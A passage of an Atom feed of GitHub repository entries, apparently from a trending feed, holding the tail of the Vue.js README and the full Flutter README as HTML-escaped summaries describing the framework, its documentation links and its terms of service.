href=&#34;https://medium.com/the-vue-point&#34;&gt;Blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://vuejobs.com/?ref=vuejs&#34;&gt;Job Board&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Contribution&lt;/h2&gt; &#xA;&lt;p&gt;Please make sure to read the &lt;a href=&#34;https://github.com/vuejs/vue/raw/dev/.github/CONTRIBUTING.md&#34;&gt;Contributing Guide&lt;/a&gt; before making a pull request. If you have a Vue-related project/component/tool, add it with a pull request to &lt;a href=&#34;https://github.com/vuejs/awesome-vue&#34;&gt;this curated list&lt;/a&gt;!&lt;/p&gt; &#xA;&lt;p&gt;Thank you to all the people who already contributed to Vue!&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/vuejs/vue/graphs/contributors&#34;&gt;&lt;img src=&#34;https://opencollective.com/vuejs/contributors.svg?width=890&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://opensource.org/licenses/MIT&#34;&gt;MIT&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Copyright (c) 2013-present, Yuxi (Evan) You&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>flutter/flutter</title>
    <updated>2022-06-03T01:29:53Z</updated>
    <id>tag:github.com,2022-06-03:/flutter/flutter</id>
    <link href="https://github.com/flutter/flutter" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Flutter makes it easy and fast to build beautiful apps for mobile and beyond&lt;/p&gt;&lt;hr&gt;&lt;a href=&#34;https://flutter.dev/&#34;&gt; &lt;h1 align=&#34;center&#34;&gt; &#xA;  &lt;picture&gt; &#xA;   &lt;source media=&#34;(prefers-color-scheme: dark)&#34; srcset=&#34;https://storage.googleapis.com/cms-storage-bucket/6e19fee6b47b36ca613f.png&#34;&gt; &#xA;   &lt;img alt=&#34;Flutter&#34; src=&#34;https://storage.googleapis.com/cms-storage-bucket/c823e53b3a1a7b0d36a9.png&#34;&gt; &#xA;  &lt;/picture&gt; &lt;/h1&gt; &lt;/a&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://cirrus-ci.com/github/flutter/flutter/master&#34;&gt;&lt;img src=&#34;https://api.cirrus-ci.com/github/flutter/flutter.svg?sanitize=true&#34; alt=&#34;Build Status - Cirrus&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/flutter/flutter/wiki/Chat&#34;&gt;&lt;img src=&#34;https://img.shields.io/discord/608014603317936148&#34; alt=&#34;Discord badge&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://twitter.com/intent/follow?screen_name=flutterdev&#34;&gt;&lt;img src=&#34;https://img.shields.io/twitter/follow/flutterdev.svg?style=social&amp;amp;label=Follow&#34; alt=&#34;Twitter handle&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://bestpractices.coreinfrastructure.org/projects/5631&#34;&gt;&lt;img src=&#34;https://bestpractices.coreinfrastructure.org/projects/5631/badge&#34; alt=&#34;CII Best Practices&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Flutter is Google&#39;s SDK for crafting beautiful, fast user experiences for mobile, web, and desktop from a single codebase. Flutter works with existing code, is used by developers and organizations around the world, and is free and open source.&lt;/p&gt; &#xA;&lt;h2&gt;Documentation&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://flutter.dev/get-started/&#34;&gt;Install Flutter&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://flutter.dev/docs&#34;&gt;Flutter documentation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/flutter/flutter/wiki&#34;&gt;Development wiki&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/flutter/flutter/raw/master/CONTRIBUTING.md&#34;&gt;Contributing to Flutter&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;For announcements about new releases, follow the &lt;a href=&#34;https://groups.google.com/forum/#!forum/flutter-announce&#34;&gt;flutter-announce@googlegroups.com&lt;/a&gt; mailing list. Our documentation also tracks &lt;a href=&#34;https://flutter.dev/docs/release/breaking-changes&#34;&gt;breaking changes&lt;/a&gt; across releases.&lt;/p&gt; &#xA;&lt;h2&gt;Terms of service&lt;/h2&gt; &#xA;&lt;p&gt;The Flutter tool may occasionally download resources from Google servers. By downloading or using the Flutter SDK you agree to the Google Terms of Service: &lt;a href=&#34;https://policies.google.com/terms&#34;&gt;https://policies.google.com/terms&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;For example, when installed from GitHub (as opposed to from a prepackaged archive), the Flutter tool will download the Dart SDK from Google servers immediately when first run, as it is used to execute the &lt;code&gt;flutter&lt;/code&gt; tool itself. This will also occur when Flutter is upgraded (e.g. by running the &lt;code&gt;flutter upgrade&lt;/code&gt; command).&lt;/p&gt; &#xA;&lt;h2&gt;About Flutter&lt;/h2&gt; &#xA;&lt;p&gt;We think Flutter will help you create beautiful, fast apps, with a productive, extensible and open development model, whether you&#39;re targeting iOS or Android, web, Windows, macOS, Linux or embedding it as the UI toolkit for a platform of your choice.&lt;/p&gt; &#xA;&lt;h3&gt;Beautiful user experiences&lt;/h3&gt; &#xA;&lt;p&gt;We want to enable designers to deliver their full creative vision without being forced to water it down due to limitations of the underlying framework. Flutter&#39;s &lt;a href=&#34;https://flutter.dev/docs/resources/inside-flutter&#34;&gt;layered architecture&lt;/a&gt; gives you control over every pixel on the screen and its powerful compositing capabilities let you overlay and animate graphics, video, text, and controls without limitation. Flutter includes a full &lt;a href=&#34;https://flutter.dev/widgets/&#34;&gt;set of widgets&lt;/a&gt; that deliver pixel-perfect experiences whether you&#39;re building for iOS (&lt;a href=&#34;https://docs.flutter.dev/development/ui/widgets/cupertino&#34;&gt;Cupertino&lt;/a&gt;) or Android (&lt;a href=&#34;https://docs.flutter.dev/development/ui/widgets/material&#34;&gt;Material&lt;/a&gt;), along with support for customizing or creating entirely new visual components.&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;https://github.com/flutter/website/raw/main/src/assets/images/docs/homepage/reflectly-hero-600px.png?raw=true&#34; alt=&#34;Reflectly hero image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Fast results&lt;/h3&gt; &#xA;&lt;p&gt;Flutter is fast. It&#39;s powered by the same hardware-accelerated 2D graphics library that underpins Chrome and Android: &lt;a href=&#34;https://skia.org/&#34;&gt;Skia&lt;/a&gt;. We architected Flutter to support glitch-free, jank-free graphics at the native speed of your device. Flutter code is powered by the world-class &lt;a href=&#34;https://dart.dev/&#34;&gt;Dart platform&lt;/a&gt;, which enables compilation to 32-bit and 64-bit ARM machine code for iOS and Android, as well as JavaScript for the web and Intel x64 for desktop devices.&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;https://github.com/flutter/website/raw/main/src/assets/images/docs/homepage/dart-diagram-small.png?raw=true&#34; alt=&#34;Dart diagram&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Productive development&lt;/h3&gt; &#xA;&lt;p&gt;Flutter offers stateful hot reload, allowing you to make changes to your code and see the results instantly without restarting your app or losing its state.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://docs.flutter.dev/development/tools/hot-reload&#34;&gt;&lt;img src=&#34;https://github.com/flutter/website/raw/main/src/assets/images/docs/tools/android-studio/hot-reload.gif?raw=true&#34; alt=&#34;Hot reload animation&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Extensible and open model&lt;/h3&gt; &#xA;&lt;p&gt;Flutter works with any development tool (or none at all), and also includes editor plug-ins for both &lt;a href=&#34;https://marketplace.visualstudio.com/items?itemName=Dart-Code.flutter&#34;&gt;Visual Studio Code&lt;/a&gt; and &lt;a href=&#34;https://plugins.jetbrains.com/plugin/9212-flutter&#34;&gt;IntelliJ / Android Studio&lt;/a&gt;. Flutter provides &lt;a href=&#34;https://pub.dev/flutter&#34;&gt;tens of thousands of packages&lt;/a&gt; to speed your development, regardless of your target platform. And accessing other native code is easy, with support for both &lt;a href=&#34;https://flutter.dev/docs/development/platform-integration/c-interop&#34;&gt;FFI&lt;/a&gt; and &lt;a href=&#34;https://flutter.dev/docs/development/platform-integration/platform-channels&#34;&gt;platform-specific APIs&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Flutter is a fully open-source project, and we welcome contributions. Information on how to get started can be found in our &lt;a href=&#34;https://raw.githubusercontent.com/flutter/flutter/master/CONTRIBUTING.md&#34;&gt;contributor guide&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
</feed>